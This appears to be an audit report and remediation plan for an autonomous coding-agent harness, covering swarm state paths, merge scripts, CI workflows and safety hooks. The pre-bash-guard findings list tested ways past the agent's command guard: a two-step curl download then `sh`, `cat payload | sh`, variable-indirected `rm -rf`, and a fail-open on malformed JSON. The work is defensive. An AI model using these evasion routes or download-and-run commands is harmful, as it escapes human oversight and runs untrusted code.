surviving.what_it_is: Streams run in worktrees (.claude/worktrees/feat-N) where hooks and the agent write all swarm state via relative paths: post-bash-log.sh appends lane events to '.swarms/events/${stream_id}.jsonl' (line 104), session-heartbeat.sh writes '.swarms/streams/<id>/state.json' and drift events (lines 169-170), and feature-stream writes 'handoff-final-<ts>.yaml at .swarms/streams/<id>/' (feature-stream.md, Output per stream). But .gitignore lines 26-31 ignore '.swarms/streams/*' and '.swarms/events/' — so these files exist only inside the worktree's private namespace and can never propagate via git either. Meanwhile every consumer reads at root: coordinator.md:77 gates dispatch on jq of '.swarms/streams/$stream/state.json' (forever 'unknown'), coordinator.md:93 reads '.swarms/streams/<id>/handoff-*.yaml', and /swarm:merge does 'ls -t .swarms/streams/$stream/handoff-final-*.yaml' — all against the root checkout where nothing was ever written. The inverse also fails: because .swarms/streams/* is gitignored, a fresh worktree contains NO brief.md/analysis.md/task.json, so feature-stream.md mandate steps 1-3 ('Read your brief: .swarms/streams/<stream-id>/brief.md') dereference files that don't exist in the stream's namespace (only the --append-system-prompt-file content survives the boundary).
surviving.why_needed: The merge decision — the entire point of the coordinator — is driven by reading handoff files and lane events that structurally cannot arrive. In an unattended auto-mode run, /swarm:merge silently skips every stream ('[ -z "$handoff" ] && continue'), the coordinator's state.json readiness gate waits forever, and lane.finished (the documented 'signal a stream is ready for a merge decision', subagent-stop.sh:204-205) lands in a gitignored worktree-local file. The swarm can dispatch and burn budget but can never autonomously converge to merged work.
surviving.what_fix_will_do: Resolve a single shared swarm root in all producers and consumers: in hooks/scripts, derive the main checkout via `git rev-parse --git-common-dir` (parent of .git) and write/read .swarms/** there absolutely (SWARM_ROOT helper sourced by post-bash-log.sh, session-heartbeat.sh, subagent-stop.sh). Have swarm-dispatch.sh copy brief.md/analysis.md/task.json into the worktree (or teach feature-stream the shared-root path). Add a smoke test that runs a hook from inside a real worktree and asserts the event file appears at the main root.
surviving.impact_on_other_features: Touches hooks post-bash-log.sh / session-heartbeat.sh / subagent-stop.sh (also used by non-swarm sessions — root resolution must no-op outside worktrees), coordinator.md and feature-stream.md agent docs, commands/swarm/{status,merge,respawn}.md, requeue-failed.sh, swarm-events-smoke.sh, setup.sh ensure_ignore, and the .gitignore policy for .swarms; harness-doctor's [swarm] gate should also check the shared root.

surviving.title: verified-merge.sh's AI-mediation and post-merge auto-fix `claude -p` invocations are broken by comments inserted mid line-continuation — the prompt string executes as a shell command instead
surviving.what_it_is: At lines 139-145, a plain '# JUSTIFIED:' comment line sits between backslash-continued arguments: the continuation joins '--append-system-prompt "$mediation_prompt" \' onto the comment line, the '#' comments out the rest, and the next physical line '"Fix the integration failure for stream $STREAM" >> "$LOG" 2>&1) || true' becomes a SEPARATE command — so `claude -p` runs with no positional prompt and no log redirection (reading stdin in a headless run), then bash tries to execute the literal string 'Fix the integration failure for stream feat-N' as a command (exit 127, swallowed by || true). The identical pattern breaks the post-merge auto-fix at lines 193-198 ('"Investigate the post-merge failure" >> "$LOG" 2>&1 || true'). Contrast with swarm-dispatch.sh which correctly uses the `# JUSTIFIED ...` backtick-substitution idiom inside its continuation. bash -n passes (it is valid syntax), so no linter catches it.
surviving.why_needed: Step 3 (AI-mediated semantic conflict resolution) is the swarm's only autonomous answer to cross-stream semantic conflicts — the explicit answer to 'what happens on merge conflicts between streams'. As shipped it never receives its task: the verify.sh re-run then escalates exit 30 every time, so every semantic conflict becomes a human escalation in an unattended run. The post-merge auto-fix PR (the recovery half of auto-revert) likewise never materializes, and an un-redirected `claude -p` waiting on stdin can hang the coordinator's merge loop overnight.
surviving.what_fix_will_do: Move the two JUSTIFIED comments above the command (or convert to the `# ...` command-substitution idiom already used in swarm-dispatch.sh:162), restoring the prompt argument and log redirection; add a rig test that dry-runs the mediation path with a stub `claude` binary and asserts the prompt arrives as argv. Effect: semantic-conflict mediation and the auto-fix PR actually run, with their $2/$5 budgets enforced.
surviving.impact_on_other_features: Touches /swarm:merge and coordinator.md merge flow (their advertised step 3 starts working); interacts with lint-exception-audit.yml conventions that motivated the inline JUSTIFIED comments — the fix should establish the safe comment idiom so silent-failure-audit doesn't reintroduce the bug; no behavior change to escalate()/auto-revert paths.

claude -p --max-budget-usd 5 ... \ / # JUSTIFIED: || true — the auto-fix agent's exit is non-authoritative... / "Investigate the post-merge failure" >> "$LOG" 2>&1 || true

surviving.title: PR lifecycle hole: nothing creates the PR or waits for CI before verified-merge.sh runs `gh pr merge`, and that failure path bypasses escalate() with a colliding exit code
surviving.what_it_is: coordinator.md mandate 5 promises 'run gh pr create, wait for CI green, squash-merge' and docs/PARALLEL-SWARM.md promises '/swarm:merge ... Opens PR #420 ... Waits for CI. Merges both' — but the implementing half, verified-merge.sh, contains no `gh pr create` and no checks-wait: step 4 force-pushes then immediately runs 'gh pr merge "$branch" --squash --delete-branch' (line 169). If no PR exists for the branch (the normal case, since no component created one) or required checks are pending under .github/rulesets/main-protection.json, it dies via 'fail "gh pr merge failed" 40' (line 170) — `fail` writes only to $LOG (no fleet blocked-mark, no decisions.log, no triage task, unlike escalate()), and exit 40 is documented at the header as 'post-merge verify failed; AUTO-REVERTED', so the coordinator misreads the failure. On an unprotected repo it instead merges instantly with zero CI, violating coordinator.md's own hard rule 'No automerge of unreviewed PRs. surviving.title: pre-bash-guard blocks common legitimate commands (exec/eval/python-c substring match + quoted-content segment split) — a terminal deny in Auto Mode
surviving.what_it_is: The deny patterns are unanchored substrings matched against every segment AND the whole command, so they fire on benign text anywhere in the command, including inside quoted string literals. `'exec +'` (pre-bash-guard.sh:57) blocks `pnpm exec`, `docker compose exec`, `kubectl exec`, and `npx playwright test --grep "exec..."`. `'eval +'` (:56) blocks any command mentioning eval. `'python3? +-c *["' ]'` (:49) — the trailing char-class includes a literal space, so `git commit -m "forbid python -c here"` matches. `'rm +-rf +/'` (:28/:64-73 family) blocks `rm -rf /tmp/build-cache` and any `rm -rf /abs/path`. Worse, line 123 splits on `;|&` regardless of quoting, so a `|` or `;` inside a commit message is treated as a command boundary. Empirically (guard fed via jq): `pnpm exec vitest run`, `docker compose exec svc test`, `kubectl exec -it pod -- ls`, `git commit -m "why eval is banned"`, `git commit -m "forbid python -c here"`, `npx playwright test --grep "exec path"`, and `rm -rf /tmp/build-cache` ALL returned exit 2 (hard block). My own audit shell commands were repeatedly hard-blocked merely for mentioning these tokens in comments.
surviving.why_needed: In Auto Mode (the documented autopilot default, constitution X) a PreToolUse exit-2 deny is terminal with no human to override. `pnpm exec`, `docker compose exec`, `kubectl exec`, and `playwright --grep` are routine in e2e build/test/deploy of real apps; commit messages routinely reference these very tokens. A harness that hard-blocks them cannot drive an app end-to-end — the agent gets stuck unable to run its test runner or commit its own fix, exactly the BREAK-LOOP trap workflow-state.sh warns about.
surviving.what_fix_will_do: Anchor the interpreter/eval/exec patterns to a command position (start-of-segment or after a pipe), not anywhere-in-string: e.g. require `(^|[;|&] *)(exec|eval) ` and `(^|[;|&] *)python3? +-c`. Strip quoted-string spans before segment-splitting so message bodies don't create phantom segments. Scope `rm -rf /` to genuinely dangerous roots (already covered by `/`, `~`, `$HOME`) and stop matching arbitrary `/abs/path`. Add an allowlist carve-out for `<tool> exec` (pnpm/docker/kubectl/npx).
surviving.impact_on_other_features: Touches .claude/hooks/pre-bash-guard.sh only; but the security invariants in CLAUDE.md (root) and .claude/CLAUDE.md X enumerate `eval`/`exec`/`python -c` as must-block, and validate.sh asserts those strings exist in the guard — the fix must keep the literal tokens present while re-scoping them, or validate.sh's security-invariant check (and the gap-fix rig test-gap-fixes.sh) will regress. No CI/agent layer changes.

IFS=$'\n' read -r -d '' -a segments < <(printf '%s' "$cmd_normalized" | sed -E 's/[;|&]+/\n/g' ; printf '\0')
'rm +-rf +/'   (empirically blocks `rm -rf /tmp/build-cache` -> exit 2)

The patterns 'eval +' (:56), 'exec +' (:57), 'python3? +-c *["' ]' (:49) and 'rm +-rf +/' (:27) are unanchored substrings matched against each segment and the whole command, firing on benign tokens including inside quoted strings. surviving.title: pre-write-secret-scan regex fallback hard-denies UUIDs, JWTs, and Stripe publishable keys — blocks normal app writes whenever gitleaks is absent
surviving.what_it_is: When `gitleaks` is not on PATH (pre-write-secret-scan.sh:48 gates the preferred path; the regex fallback at :69-128 is what runs otherwise — and the target project default has no gitleaks), the fallback denies any Write whose content matches broad patterns. Empirically (PATH stripped of gitleaks, decision read from emitted JSON): a UUID in `user.test.ts` -> deny, a UUID in a SQL seed -> deny, a JWT-shaped test value -> deny, a `pk_live_` publishable key -> deny.

In Auto Mode the deny is final, so the agent literally cannot write a seed file or a test fixture containing a UUID on any machine without gitleaks installed — which is most fresh greenfield/brownfield targets. surviving.title: pre-bash-guard evasion routes still open: two-step download-then-run, `cat file | sh`, `sh ./script.sh`, and variable-indirected rm -rf
surviving.what_it_is: The curl|sh family (pre-bash-guard.sh:37-42) only catches a single pipeline `curl ...| sh`. It does not catch: (a) two-step download-then-execute across segments — empirically `curl https://x.io/i -o /tmp/i.sh ; sh /tmp/i.sh` returned exit 0 (allowed); (b) piping a local file to a shell — `cat payload | sh` returned exit 0 (the decode-then-pipe list only enumerates base64/xxd/printf/openssl, not `cat`); (c) running a fetched script directly — `sh ./installer.sh` returned exit 0; (d) variable indirection — `x=rm -rf ; $x /var/data` returned exit 0 because the dangerous token is only assembled at runtime. The blocked baselines still work (`curl -fsSL ...| sh` and `rm -rf /var/...` -> exit 2), so the guard gives a false sense of coverage.
surviving.why_needed: The constitution (X) advertises these hooks as the FIRST, deterministic security layer that hard-blocks destructive ops 'before the classifier, zero prompts' in Auto Mode. An autonomous overnight run that fetches and executes a payload in two steps, or pipes a downloaded file to sh, completely bypasses the named protection — precisely the unattended context where there is no human backstop. A security layer that is trivially side-stepped by reordering two commands is worse than none because it is trusted.
surviving.what_fix_will_do: Add deny rules for `cat ...| (sh|bash|zsh)` and for invoking a shell on a path that was written/fetched in the same command; broaden the substitution/indirection detection so `$VAR` expansions that could be `rm -rf`/`curl` are treated as 'ask'. Treat a segment that pipes ANY command output into `sh|bash|zsh` as suspicious (default-ask), not just the enumerated decoders. Document that cross-segment download-then-run cannot be fully caught by static patterns and lean on the network-egress posture instead. Pair with the layered defense (the Sonnet classifier) rather than claiming the hook alone is sufficient.
surviving.impact_on_other_features: Touches .claude/hooks/pre-bash-guard.sh. Broadening `*| sh` risks new false positives (interacts with finding 1) — e.g. `... | bash .claude/hooks/x.sh` is a legit invocation that the existing `printf ...| (sh|bash|zsh)` rule already over-blocks; the fix must distinguish piping CONTENT into a shell vs invoking a shell on a script file. Settings.json deny-list and the security-guard skill describe the same threat model and should be kept consistent.

subst_sink_patterns=( '\$\([^)]*(curl|wget|fetch)' ... )   (only curl/wget/fetch substitution bodies — `$VAR` indirection of rm/sh not covered)

The decode-then-pipe list (:44-62) enumerates base64/xxd/printf/openssl but omits `cat`, so `cat file | sh` is a flat gap in the constitution-X-stated `base64|sh`/`curl|sh` invariant. Nuance worth recording (does not change severity): constitution X documents a SECOND layer (Sonnet classifier) in Auto Mode, and the finding itself concedes cross-segment download-then-run can't be fully caught statically — so 'completely bypasses' is partly softened by the classifier. surviving.title: pre-bash-guard fails OPEN on malformed stdin: `set -euo pipefail` + unguarded jq aborts the guard before any pattern check
surviving.what_it_is: pre-bash-guard.sh runs `set -euo pipefail` (line 6) and parses the command with `cmd=$(printf '%s' "$input" | jq -r '.tool_input.command // ""')` (line 12) with no `2>/dev/null` and no fallback. Empirically, feeding malformed JSON makes jq exit non-zero; under `pipefail` the command substitution fails and `set -e` aborts the whole script at line 12 with exit code 5 — NOT exit 2, NOT exit 0. Per the Claude Code hook protocol, only exit 2 blocks; any other non-zero is a non-fatal hook error and the tool proceeds. So a malformed payload disables the destructive-command guard entirely (fail-open). Empty stdin is handled (cmd empty -> exit 0) but the malformed case is not. Note other hooks deliberately use `set -uo` (no -e) plus `2>/dev/null` precisely to avoid this.
surviving.why_needed: The guard is the deterministic first line of defense in Auto Mode. A hook that silently stops evaluating on any stdin parse hiccup means a destructive command can slip through whenever the payload deviates from the exact expected shape (tool-input schema drift across Claude Code versions, unusual escaping). For an unattended pipeline the failure is invisible — there is no operator to notice the exit-5 'hook error' line.
surviving.what_fix_will_do: Make the parse tolerant and fail-CLOSED: `cmd=$(printf '%s' "$input" | jq -r '.tool_input.command // ""' 2>/dev/null || true)`; if jq fails or returns nothing on non-empty input, either exit 0 only on provably-empty input or emit an `ask` so a parse failure cannot silently allow. Drop `-e` (match the rest of the hook fleet which uses `set -uo pipefail` + explicit error handling) so a single failed sub-command can't abort the guard mid-evaluation.
surviving.impact_on_other_features: Isolated to .claude/hooks/pre-bash-guard.sh. Removing `-e` requires auditing the script's other commands for silent-failure assumptions, but the segment loop and pattern checks are already exit-code-driven, so the change is contained. No settings.json/CI/agent impact; aligns the guard's error discipline with the sibling hooks (pre-spawn-cost-gate, workflow-state) that already use `set -uo`.

surviving.title: claude.yml grants contents:write + id-token:write to anyone who can type @claude — no author-association guard

Behavior for maintainers is unchanged.
surviving.impact_on_other_features: claude.yml only at the file level; aligns with .claude/CLAUDE.md §II prompt-defense and the security agent's checklist; no effect on claude-review/claude-security (separate workflows). surviving.verdict_note: The quoted facts are accurate (claude.yml:18-22 permissions, :26-30 string-only @claude gate, no author_association in the if:), but the central exploit claim — 'a drive-by account can invoke a write-capable agent' — is wrong: anthropics/claude-code-action@v1 validates the triggering actor's repository permissions by default ('The action can only be triggered by users with write access to the repository', claude-code-action docs/security.md); claude.yml sets neither allowed_bots nor allowed_non_write_users, so non-collaborator comments cause the action's prepare step to refuse before any agent runs. surviving.title: Three LLM workflows run on every push with no concurrency cancellation — per-PR gate cost compounds in auto mode
surviving.what_it_is: Every `synchronize` event launches three Anthropic-billed runs: claude-review (Sonnet, 20-min timeout), claude-security (Opus multi-agent, 25-min timeout), and pr-review anti-slop (Sonnet, max_turns 20). None of the three has a `concurrency:` group — only ci.yml does (`group: ci-${{ github.ref }}, cancel-in-progress: true`, lines 15-17) — so an autopilot/swarm branch that pushes every few minutes (wip-checkpoint discipline) stacks superseded LLM runs instead of cancelling them. claude-security additionally has no `branches: [main]` filter, so it also fires on PRs targeting non-main branches (swarm integration branches), and pr-review duplicates a Sonnet pass that is `continue-on-error: true` (advisory) yet still costs a full run per push. docs/CI-COST.md exists but the gating set itself doesn't implement its own discipline.
surviving.why_needed: Auto mode multiplies pushes (WIP checkpoints, self-heal loops up to 3 attempts, up to 10 swarm streams). Without cancellation the gate set's API+runner cost scales with push count, eats the Anthropic spend cap that cost-report.sh/budget enforcement watches, and queues stale reviews that post outdated findings onto moved PRs.
surviving.what_fix_will_do: Add `concurrency: { group: <wf>-${{ github.event.pull_request.number }}, cancel-in-progress: true }` to claude-review.yml, claude-security.yml and pr-review.yml; add `branches: [main]` to claude-security's pull_request trigger (mirrors claude-review); optionally defer the Opus security run to ready_for_review + label for draft-heavy flows. Net effect: at most one in-flight LLM run per gate per PR.

surviving.what_it_is: Two consistency bugs in the per-stack arms. (a) verify.sh:94-99 and test-unit.sh:9-12 append the vitest-specific `--run` flag unconditionally (`npm test -- --run`, `pnpm test --run`, `yarn test --run`): a jest or node:test greenfield rejects the unrecognized flag, so unit tests fail on every iteration for non-vitest runners (fail-closed churn that self-heal will 'fix' by mangling the test script); bun is special-cased but verify.sh checks `bun.lock || bun.lockb` (line 83) while lint.sh:38 checks only `bun.lock` — a bun.lockb-era repo falls to npm in lint. (b) lint.sh's java arm (lines 69-74) is an if/elif with NO else: when neither gradle nor mvn binaries are on PATH the arm does nothing and `failures` stays 0 — silent pass; same silent-skip shape for terraform (tflint), docker (hadolint), shell (shellcheck), sql (sqlfluff) when tools are absent, while the python arm fails on missing ruff. surviving.why_needed: Auto mode needs deterministic, stack-agnostic gates: a runner flag that breaks jest forces the agent into destructive workarounds, and tool-absence silent passes mean a detected java stack with no JDK toolchain in the overnight sandbox lints green. surviving.what_fix_will_do: Detect the runner before adding flags (grep package.json devDeps for vitest vs jest; pass `--run` only for vitest, `--ci` for jest, nothing otherwise); unify bun lockfile checks; give every lint.sh/typecheck.sh arm an explicit else that either fails or prints a counted `⚠ tool missing` failure consistent with the python arm (with a documented LINT_TOOL_MISSING_OK operator escape for genuinely optional infra linters).

surviving.what_it_is: At verified-merge.sh:139-145 and 193-198, a `# JUSTIFIED:` comment line sits between a trailing `\` continuation and the positional prompt. Shell semantics: the comment terminates the claude command after --append-system-prompt, so `claude -p` runs with NO user prompt and its output unredirected; the next line ('Fix the integration failure for stream ...' / 'Investigate the post-merge failure' >> $LOG) executes as a separate command-not-found whose 127 is swallowed by `|| true`. I confirmed by simulation with a stub: claude received only 9 args ('-p --max-turns 30 --max-budget-usd 2 --permission-mode auto --append-system-prompt test prompt'), no prompt, output to stdout, subshell exit 0. bash -n passes — nothing catches it.
surviving.why_needed: This is the swarm's self-heal ladder for integration failures: step 3 mediation is the only thing standing between 'rebase/verify failed' and a human-required escalation, and the post-merge autofix is the only thing that re-opens a fix PR after main is auto-reverted. With both rungs dead, every semantic conflict in a 10-stream auto-mode swarm escalates (exit 30) instead of self-healing, and every post-merge revert leaves main reverted with no fix PR in flight — the overnight fleet's recovery story silently degrades to 'wait for a human'.
surviving.what_fix_will_do: Move the JUSTIFIED comments above the command (or onto the `|| true` line without breaking continuation), keep the positional prompt and `>> $LOG 2>&1` attached, and add a smoke test (stub `claude`, assert argv contains the prompt and that stdout lands in the log). Mediation will then actually run before escalate(30), and the autofix PR will actually open after an auto-revert.
surviving.impact_on_other_features: Isolated to .claude/scripts/verified-merge.sh, but the fix pattern matters for lint-silent-failures.sh conventions (its required JUSTIFIED comments caused the breakage — the linter should flag comments that terminate a continuation). Downstream consumers unchanged: fleet.json statuses, decisions.log, findings-to-tasks triage tasks.

plan.executive_summary: The 77 confirmed findings cluster into five failure families: (1) the deterministic security layer is simultaneously bypassable (MCP writes, npx, cat|sh, jq fail-open) and over-blocking (exec/eval/UUID false denies are terminal in Auto Mode), and the constitution guard denies the very TASKS.md/specs writes every inner-loop agent needs; (2) the verification/merge spine is structurally red — evidence-gate cannot pass on any real project (ignored SKIPs, gitignored ledger logs, no toolchain install, no app server, web-only AC proof, factory state shipped into fresh projects, silent PASS on non-big-4 stacks); (3) the autonomous loop's state machine is prose — picker is dep/priority/template-line-blind, loop-control and budgets have no driver, analyze gate has no producer, crashes orphan [~] tasks, and a stop-gate livelock burns overnight budget; (4) swarm and release last-mile are wired to paths that never converge (worktree-local gitignored state, dead claude -p invocations, no PR/CI wait, no auto-merge policy, no ramp driver, no executable rollback); (5) docs/ops drift. The plan fixes auto-mode safety first (a harness that can hurt or wedge itself unattended must be grounded before its gates are tightened), then the merge/verification spine (so green means green and red is reachable-fixable), then mechanizes the loop, then swarm/brownfield/release convergence, then robustness and doc truthfulness. Two load-bearing early decisions gate many items: the lock-safe task-status write path (P1) and the ledger-evidence storage format (P2), each consumed by 4+ later fixes.

plan_phases.phase: Phase 1 — Auto-mode safety: make the deterministic guard layer fail closed, stop blocking the harness's own legitimate work, and give the loop a sanctioned write path
plan_phases.rationale: Everything else assumes an unattended agent that (a) cannot escape the guard layer, (b) is not terminally denied for routine commands, and (c) can mutate its sole source of truth safely. failure-recovery-1 is the single most pipeline-blocking defect (every agent is instructed to do a write the guard hard-denies); the MCP write bypass is the single worst security hole. Fix the guard layer's correctness BEFORE tightening any gates in Phase 2, or the tightened gates will wedge against a broken substrate.

plan_phases.phase: Phase 2 — Unbreak the verification/merge spine: every required gate must be passable on a real project and red must mean something real
plan_phases.rationale: The delivery pipeline currently has gates that structurally cannot pass (evidence-gate on any real PR once a task is [x]) next to gates that pass vacuously (verify.sh on non-big-4 stacks, forgeable touch-ledgers, AC-format mismatches). Fix passability and truthfulness together — tightening forgeable gates without first making honest passage possible would just deepen the wedge. The single storage decision (commit verify/**/{red,green}.log vs a committed ledger.json) must be made first; four items consume it.

plan_phases.rationale: These are the multipliers: swarm and release defects don't corrupt single-session work but cap what unattended runs can ever deliver (state that never propagates, dead mediation code, merges that bypass CI or never happen, ramps with no driver, rollback as prose). Brownfield items make adoption honest. Ordered after Phases 1-3 because nearly every item here consumes their primitives (task-status, SWARM hooks edited in P1, required-checks decisions in P2).

plan.impact_matrix_notes:
ORDERING SPINE: (1) Phase 1's task-status.sh is the keystone — it is a hard prerequisite for the Phase 3 loop-transition recorder (autopilot-2: post-write-roadmap diffs must flow through one sanctioned mutator), the Phase 3 orphan reconciler (failure-recovery-3), and Phase 4's coordinator-single-writer TASKS.md model (swarm-6), and it resolves the feature-stream/parallel-swarm ownership contradiction that swarm-5/6 then codify. (2) Phase 2's ledger-storage decision (un-ignore verify/**/{red,green}.log vs committed ledger.json) is consumed by FOUR fixes — greenfield-2/3, tdd-loop-1/2 content gates, evidence-gate G49, and gc-verify archival semantics — make it once, first, and version the tdd-ledger.sh header as a parsed contract. (3) ci-gates-1 (more required checks) and especially release-deploy-2 (auto-merge) MUST follow evidence-gate passability (Phase 2 items 1-3) and ruleset application/verification (ci-gates-2): enabling auto-merge or new required contexts against today's structurally-red gates either wedges every PR or automates merging around broken gates. (4) docs-truth-1's widened claims audit is strictly last — it enforces truths the earlier phases create.

SHARED-FILE COLLISIONS: pre-bash-guard.sh is edited by three Phase 1 items (FP re-scope, evasion closure, jq fail-closed) — do as one PR, keeping the literal must-block tokens that validate.sh's security-invariant grep and the gap-fix rig assert. subagent-stop.sh is edited in Phase 1 (stop_hook_active) and Phase 4 (swarm-1 SWARM_ROOT) — P1 lands first, P4 rebases; staged/ copies of both stop hooks must update in lockstep or the staged install regresses the fix. verify.sh is touched by Phase 2 items 1, 6, 7, 10 and Phase 5 stack items — sequence within Phase 2 as: ledger unification → stack engine → coverage polarity → char-gate, since the stack engine defines where the other gates sit. pre-bash-dep-freshness.sh is touched in Phase 1 (npx coverage) and Phase 5 (latency/cache) — ideally one combined change. The playwright evidence template is touched by e2e-rig-1 (P2) and e2e-rig-5 (P5) — fold the HAR note into the P2 edit if convenient.

CROSS-CUTTING SEMANTICS: the legacy-glob grammar must be defined once and shared by Phase 1's pre-edit-legacy-guard hook, verify.sh's char gate, and Phase 4's brownfield-1 manifest seeding — otherwise the write-time and verify-time halves of 'no tests = no writes' disagree. The MCP-write guard (P1) must mirror the native Write allow/deny path policy AND the post-FP-demotion secret rules, or filesystem-MCP writes to .claude/memory get blocked while native writes pass. The accept:-command normalization is shared between tdd-loop-1's command-binding gate (P2) and tdd-loop-5's accept lint/re-run (P3) — one shared lib function. Spec archiving (autopilot-1's idle phase) and spec-pipeline-5's max(active∪archive)+1 allocation are two halves of one lifecycle change — land together or IDs and phase detection disagree. validate.sh gains new checks in every phase (MCP matcher invariant, hook registration, task grammar, live-artifact lint, ruleset coverage, doc greps) — each must be added alongside its producer so harness-validate.yml never goes red between PRs; the Spec-003 skip-guard and its allow-skip-gates operator marker must survive every gate change untouched (it is the pattern brownfield-2 and stack-portability-3 deliberately reuse, not a thing to relax).

EXPECTED RED-SHIFT: Phase 2's stack engine and coverage polarity, Phase 4's char-gate arming on monorepos, and Phase 5's lint tool-missing escalation all convert today's silent greens into loud reds in adopter repos — intended, but each needs its operator waiver documented (allow-skip-gates / LINT_TOOL_MISSING_OK) and should land after the corresponding fix path (self-heal messages, characterize skill, rig bootstrap) exists, so an unattended loop hitting the new red has a mechanical way out.
